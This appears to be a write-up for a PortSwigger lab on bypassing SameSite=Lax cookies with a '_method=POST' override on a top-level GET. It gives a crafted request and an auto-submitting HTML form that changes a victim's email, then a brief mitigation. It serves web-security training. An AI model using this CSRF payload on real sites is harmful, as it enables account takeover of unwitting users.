# Lab 09 — SameSite Lax bypass via method override

> **Expert** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

**Entry point:** session cookies are `SameSite=Lax` (cross-site POSTs carry
no cookie) — but the app supports method override.

## Solution

1. Lax sends cookies on **top-level GET** navigations. Confirm the email
   change accepts GET with a method override:

```
GET /my-account/change-email?email=pwned@evil-you.net&_method=POST
```

2. Host the exploit as a simple GET navigation (form with `method=GET` or a
   script `document.location`):

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="GET">
  <input type="hidden" name="email" value="pwned@evil-you.net">
  <input type="hidden" name="_method" value="POST">
</form>
<script>document.forms[0].submit();</script>
```

3. Deliver to victim — the top-level GET carries the Lax cookie, the server
   treats it as POST — lab solved.

## Mitigation

Remove method-override support (`_method`) from production; keep
SameSite=Strict for privileged sessions.
